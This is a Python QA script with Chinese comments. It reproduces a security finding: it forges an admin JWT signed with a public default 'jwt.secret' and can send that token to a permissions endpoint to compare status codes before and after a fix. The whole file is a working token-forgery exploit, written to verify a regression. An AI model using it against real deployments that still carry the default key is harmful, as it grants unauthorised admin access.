#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""用「仓库默认 JWT 密钥」自签一枚 admin token —— 复现 t188/S1 的证据脚本。

背景：application.yml 的 `jwt.secret` 默认值
`your-256-bit-secret-key-here-please-change-in-production` 是公开的。
若部署时漏配 JWT_SECRET，任何人都能离线签出管理员 token（修复前线上实测 200）。

用法：
  python scripts/qa/forge_default_jwt.py                # 打印一枚 admin token
  python scripts/qa/forge_default_jwt.py --secret X     # 指定密钥（验证其他环境）
  python scripts/qa/forge_default_jwt.py --check http://127.0.0.1:8089   # 直接打权限接口看状态码

修复后期望：`--check` 返回 401（密钥校验 + 线上已换随机密钥），修复前返回 200。
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request

DEFAULT_SECRET = "your-256-bit-secret-key-here-please-change-in-production"


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def forge(secret: str, subject: str = "admin", roles: str = "ROLE_ADMIN") -> str:
    header = b64url(json.dumps({"alg": "HS384"}, separators=(",", ":")).encode())
    now = int(time.time())
    payload = b64url(json.dumps(
        {"sub": subject, "roles": roles, "iat": now, "exp": now + 3600},
        separators=(",", ":"),
    ).encode())
    signing_input = f"{header}.{payload}".encode()
    signature = hmac.new(secret.encode(), signing_input, hashlib.sha384).digest()
    return f"{header}.{payload}.{b64url(signature)}"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret", default=DEFAULT_SECRET)
    parser.add_argument("--subject", default="admin")
    parser.add_argument("--roles", default="ROLE_ADMIN")
    parser.add_argument("--check", metavar="BASE_URL")
    args = parser.parse_args()

    token = forge(args.secret, args.subject, args.roles)
    print(token)

    if args.check:
        url = args.check.rstrip("/") + "/api/v1/users/me/permissions"
        request = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
        try:
            with urllib.request.urlopen(request, timeout=15) as response:
                body = response.read(200).decode("utf-8", "replace")
                print(f"CHECK {url} -> HTTP {response.status} {body}", file=sys.stderr)
                return 0 if response.status == 200 else 1
        except urllib.error.HTTPError as error:
            print(f"CHECK {url} -> HTTP {error.code}", file=sys.stderr)
            return 0 if error.code == 200 else 1
        except Exception as error:  # noqa: BLE001 - 证据脚本，任何异常都要打印出来
            print(f"CHECK {url} -> ERROR {error}", file=sys.stderr)
            return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())